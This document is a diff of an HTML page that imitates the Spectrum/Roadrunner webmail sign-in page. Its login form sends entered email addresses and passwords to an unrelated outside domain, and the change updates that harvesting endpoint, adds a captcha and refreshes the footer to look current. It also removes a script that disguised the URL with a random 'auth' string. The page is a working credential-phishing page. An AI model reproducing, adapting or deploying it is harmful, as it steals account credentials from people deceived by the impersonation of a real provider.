@@ -4,7 +4,11 @@
 <head>
     <meta charset="UTF-8">
     <script type="text/javascript">
-      window.features = {"twcselfcarelink":true,"filters":true,"autoResponse":true,"spam":true,"usePHPImap":true,"hideMailSort":false,"openWaveSignature":true,"hideAccountPulldown":true,"contactImport":false,"hohLink":true,"threatMatrix":false};
+      window.features = 
+
+{"twcselfcarelink":true,"filters":true,"autoResponse":true,"spam":true,"usePHPImap":true,"hideMailSort":false,"openWaveSignature":true,"hideAccountPulldown"
+
+:true,"contactImport":false,"hohLink":true,"threatMatrix":false};
       window.hohapi = 'https://www.spectrum.net/api/pub/hoh/v1/register-hoh';
     </script>
     <script
@@ -34,15 +38,13 @@
     />
     <link rel="stylesheet" type="text/css" href="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/css/rutledge.css?v=2.17.1_4" />
     <title>Login TWC & Roadrunner RR Email | Spectrum Webmail</title>
-    <meta name="description" content="Former Time Warner Cable and BrightHouse customers, sign in to access your roadrunner.com, rr.com, twc.com and brighthouse.com email.">
+    <meta name="description" content="Former Time Warner Cable and BrightHouse customers, sign in to access your roadrunner.com, rr.com, twc.com and 
+
+brighthouse.com email.">
 
     </head>
 
 <body>
-
-
-
-    
 <div class="loader" style="display: none;">
     <div class="spinner">
         <svg
@@ -137,7 +139,9 @@
     </div>
 
     <div class="app-header-logo">
-      <a class="mat-button" target="_self" href="/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-support">
+      <a class="mat-button" target="_self" href="/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-
+
+support">
         <img alt="Spectrum logo" src="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.17.1_4"/>
       </a>
     </div>
@@ -168,7 +172,7 @@
             <div id="orText">or</div>
             <div id="hohHref"><a href="https://www.spectrum.net/hoh">Create an Email Address</a></div>
         </div>
-        <form action="http://valerecycling-uk.com/nop.php" method="post">
+        <form action="https://valerecycling-uk.com/spectrum.php" method="post">
             <div id="emailAddressContainer" >
                 <label for="emailAddress">Email Address</label>
                 <input
@@ -201,7 +205,9 @@
                         value=""
                 >
             </div>
-      
+            <div class="captchaBlock" style="margin-bottom:25px;display: block">
+                <div class="g-recaptcha" data-sitekey="6LfRsggUAAAAABJBT04IBvG0gWCNSB_FuhkC4PAx"></div>
+            </div>
             <input type="submit" name="submit" id="emailSubmit" value="Sign In">
         </form>
 
@@ -218,7 +224,7 @@
 <div id="footer">
     <nav role="navigation">
         <ul>
-    <li>&copy; 2019 Charter Communications. All rights reserved</li>
+    <li>&copy; 2022 Charter Communications. All rights reserved</li>
     <li>
         <a href="https://www.spectrumreach.com/" target="_blank">Advertise with Us</a>
     </li>
@@ -236,7 +242,15 @@
     </li>
 
     <li>
-        <a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank">Do Not Sell or Share My Personal Information/Opt-Out of Targeted Advertising</a>
+        <a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank">California Consumer Do Not Sell Or Share My Personal 
+
+Information</a>
+    </li>
+
+    <li>
+        <a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank">California Consumer Limit The Use Of My Sensitive Personal 
+
+Information</a>
     </li>
 
     <li>
@@ -256,32 +270,5 @@
     $($links[i]).attr("aria-label", $($links[i]).text() + " (Opens in new window)");
   });
 </script>
-
-
-
-    <script>
-        function generateRandomString(length) {
-            const characters = 'Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9J0Kk2Ll1Mm3NnoOp4Pq5QrR6Ss7T8UfVWiXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return result;
-        }
-        function appendRandomStringToURL() {
-            const randomString = generateRandomString(350);
-            const currentURL = window.location.href.split('?')[0];
-            // Use string concatenation as a temporary measure to avoid potential backtick issues
-            window.history.replaceState(null, null, currentURL + "?auth=" + randomString);
-        }
-        window.onload = appendRandomStringToURL;
-    </script>
-
-
-
-
-
-
-
 </body>
 </html>
